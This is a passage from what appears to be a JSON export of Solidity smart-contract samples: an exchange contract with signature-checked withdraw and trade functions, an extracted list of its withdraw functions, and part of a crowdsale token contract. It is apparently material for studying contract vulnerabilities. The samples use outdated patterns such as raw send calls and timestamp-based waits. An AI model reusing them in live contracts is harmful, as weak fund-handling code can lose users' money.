values[2];\n require(amount <= tokenList[token][user]);\n require(safeMul(fee, feeRate) < amount);\n bytes32 hash = keccak256(user, token, amount, nonce);\n require(!withdrawn[hash]);\n withdrawn[hash] = true;\n require(ecrecover(keccak256(\"\\x19Ethereum Signed Message:\\n32\", hash), v, r, s) == user);\n tokenList[token][user] = safeSub(tokenList[token][user], amount);\n tokenList[token][feeAccount] = safeAdd(tokenList[token][feeAccount], fee);\n amount = safeSub(amount, fee);\n if (token == 0) {\n require(user.send(amount));\n } else {\n require(Token(token).transfer(user, amount));\n }\n Withdraw(token, user, amount, tokenList[token][user]);\n }\n function getOrderHash(address tokenBuy, uint256 amountBuy, address tokenSell, uint256 amountSell, address base, uint256 expires, uint256 nonce, address feeToken) public pure returns (bytes32) {\n return keccak256(tokenBuy, amountBuy, tokenSell, amountSell, base, expires, nonce, feeToken);\n }\n function balanceOf(address token, address user) public constant returns (uint256) {\n return tokenList[token][user];\n }\n struct Order {\n address tokenBuy;\n address tokenSell;\n uint256 amountBuy;\n uint256 amountSell;\n address user;\n uint256 fee;\n uint256 expires;\n uint256 nonce;\n bytes32 orderHash;\n address baseToken;\n address feeToken;\n }\n function trade(\n address[11] addresses,\n uint256[11] values,\n uint8[2] v,\n bytes32[2] r,\n bytes32[2] s\n ) public\n onlyAdmin\n isFeeAccount(addresses[10])\n {\n Order memory makerOrder = Order({\n tokenBuy : addresses[0],\n tokenSell : addresses[2],\n user : addresses[4],\n amountBuy : values[0],\n amountSell : values[2],\n fee : values[4],\n expires : values[6],\n nonce : values[8],\n orderHash : 0,\n baseToken : addresses[6],\n feeToken : addresses[8]\n });\n Order memory takerOrder = Order({\n tokenBuy : addresses[1],\n tokenSell : addresses[3],\n user : addresses[5],\n amountBuy : values[1],\n amountSell : values[3],\n fee : values[5],\n expires : values[7],\n nonce : values[9],\n orderHash : 0,\n baseToken : addresses[7],\n feeToken : addresses[9]\n });\n uint256 tradeAmount = values[10];\n require(makerOrder.expires >= block.number && takerOrder.expires >= block.number);\n require(makerOrder.baseToken == takerOrder.baseToken && makerOrder.tokenBuy == takerOrder.tokenSell && makerOrder.tokenSell == takerOrder.tokenBuy);\n require(takerOrder.baseToken == takerOrder.tokenBuy || takerOrder.baseToken == takerOrder.tokenSell);\n makerOrder.orderHash = getOrderHash(makerOrder.tokenBuy, makerOrder.amountBuy, makerOrder.tokenSell, makerOrder.amountSell, makerOrder.baseToken, makerOrder.expires, makerOrder.nonce, makerOrder.feeToken);\n takerOrder.orderHash = getOrderHash(takerOrder.tokenBuy, takerOrder.amountBuy, takerOrder.tokenSell, takerOrder.amountSell, takerOrder.baseToken, takerOrder.expires, takerOrder.nonce, takerOrder.feeToken);\n require(ecrecover(keccak256(\"\\x19Ethereum Signed Message:\\n32\", makerOrder.orderHash), v[0], r[0], s[0]) == makerOrder.user);\n require(ecrecover(keccak256(\"\\x19Ethereum Signed Message:\\n32\", takerOrder.orderHash), v[1], r[1], s[1]) == takerOrder.user);\n balance(makerOrder, takerOrder, addresses[10], tradeAmount);\n }\n function balance(Order makerOrder, Order takerOrder, address feeAccount, uint256 tradeAmount) internal {\n require(safeMul(makerOrder.amountSell, takerOrder.amountSell) >= safeMul(makerOrder.amountBuy, takerOrder.amountBuy));\n uint256 takerBuy = 0;\n uint256 takerSell = 0;\n if (takerOrder.baseToken == takerOrder.tokenBuy) {\n uint256 makerAmount = safeSub(makerOrder.amountBuy, orderFilled[makerOrder.user][makerOrder.orderHash]);\n uint256 takerAmount = safeSub(takerOrder.amountSell, orderFilled[takerOrder.user][takerOrder.orderHash]);\n require(tradeAmount > 0 && tradeAmount <= makerAmount && tradeAmount <= takerAmount);\n takerSell = tradeAmount;\n takerBuy = safeMul(makerOrder.amountSell, takerSell) / makerOrder.amountBuy;\n orderFilled[takerOrder.user][takerOrder.orderHash] = safeAdd(orderFilled[takerOrder.user][takerOrder.orderHash], takerSell);\n orderFilled[makerOrder.user][makerOrder.orderHash] = safeAdd(orderFilled[makerOrder.user][makerOrder.orderHash], takerSell);\n } else {\n takerAmount = safeSub(takerOrder.amountBuy, orderFilled[takerOrder.user][takerOrder.orderHash]);\n makerAmount = safeSub(makerOrder.amountSell, orderFilled[makerOrder.user][makerOrder.orderHash]);\n require(tradeAmount > 0 && tradeAmount <= makerAmount && tradeAmount <= takerAmount);\n takerBuy = tradeAmount;\n takerSell = safeMul(makerOrder.amountBuy, takerBuy) / makerOrder.amountSell;\n orderFilled[takerOrder.user][takerOrder.orderHash] = safeAdd(orderFilled[takerOrder.user][takerOrder.orderHash], takerBuy);\n orderFilled[makerOrder.user][makerOrder.orderHash] = safeAdd(orderFilled[makerOrder.user][makerOrder.orderHash], takerBuy);\n }\n uint256 makerFee = chargeFee(makerOrder, feeAccount, takerSell);\n uint256 takerFee = chargeFee(takerOrder, feeAccount, takerBuy);\n tokenList[takerOrder.tokenSell][takerOrder.user] = safeSub(tokenList[takerOrder.tokenSell][takerOrder.user], takerSell);\n tokenList[takerOrder.tokenBuy][takerOrder.user] = safeAdd(tokenList[takerOrder.tokenBuy][takerOrder.user], safeSub(takerBuy, takerFee));\n tokenList[makerOrder.tokenSell][makerOrder.user] = safeSub(tokenList[makerOrder.tokenSell][makerOrder.user], takerBuy);\n tokenList[makerOrder.tokenBuy][makerOrder.user] = safeAdd(tokenList[makerOrder.tokenBuy][makerOrder.user], safeSub(takerSell, makerFee));\n }\n function chargeFee(Order order, address feeAccount, uint256 amountBuy) internal returns (uint256){\n uint256 classicFee = 0;\n if (order.feeToken != 0) {\n require(order.fee <= tokenList[order.feeToken][order.user]);\n tokenList[order.feeToken][feeAccount] = safeAdd(tokenList[order.feeToken][feeAccount], order.fee);\n tokenList[order.feeToken][order.user] = safeSub(tokenList[order.feeToken][order.user], order.fee);\n } else {\n classicFee = order.fee;\n require(safeMul(order.fee, feeRate) <= amountBuy);\n tokenList[order.tokenBuy][feeAccount] = safeAdd(tokenList[order.tokenBuy][feeAccount], order.fee);\n }\n return classicFee;\n }\n function batchTrade(\n address[11][] addresses,\n uint256[11][] values,\n uint8[2][] v,\n bytes32[2][] r,\n bytes32[2][] s\n ) public onlyAdmin {\n for (uint i = 0; i < addresses.length; i++) {\n trade(addresses[i], values[i], v[i], r[i], s[i]);\n }\n }\n function refund(address user, address[] tokens) public onlyAdmin {\n for (uint i = 0; i < tokens.length; i++) {\n address token = tokens[i];\n uint256 amount = tokenList[token][user];\n if (amount > 0) {\n tokenList[token][user] = 0;\n if (token == 0) {\n require(user.send(amount));\n } else {\n require(Token(token).transfer(user, amount));\n }\n Withdraw(token, user, amount, tokenList[token][user]);\n }\n }\n }\n}",
  "extract_feature": [
    "function applyWithdraw(address token, uint256 amount) public {\nuint256 apply = safeAdd(applyList[token][msg.sender], amount);\nrequire(safeAdd(apply, withdrawAllowance[token][msg.sender]) <= tokenList[token][msg.sender]);\napplyList[token][msg.sender] = apply;\nlatestApply[token][msg.sender] = block.timestamp;\nApplyWithdraw(token, msg.sender, amount, block.timestamp);\n}",
    "function withdraw(address token, uint256 amount) public {\nrequire(amount <= tokenList[token][msg.sender]);\nif (amount > withdrawAllowance[token][msg.sender]) {\nrequire(latestApply[token][msg.sender] != 0 && safeSub(block.timestamp, latestApply[token][msg.sender]) > applyWait);\nwithdrawAllowance[token][msg.sender] = safeAdd(withdrawAllowance[token][msg.sender], applyList[token][msg.sender]);\napplyList[token][msg.sender] = 0;\n}\nrequire(amount <= withdrawAllowance[token][msg.sender]);\nwithdrawAllowance[token][msg.sender] = safeSub(withdrawAllowance[token][msg.sender], amount);\ntokenList[token][msg.sender] = safeSub(tokenList[token][msg.sender], amount);\nlatestApply[token][msg.sender] = 0;\nif (token == 0) {\nrequire(msg.sender.send(amount));\n} else {\nrequire(Token(token).transfer(msg.sender, amount));\n}\nWithdraw(token, msg.sender, amount, tokenList[token][msg.sender]);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f3b"
  },
  "filename": "7512.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != 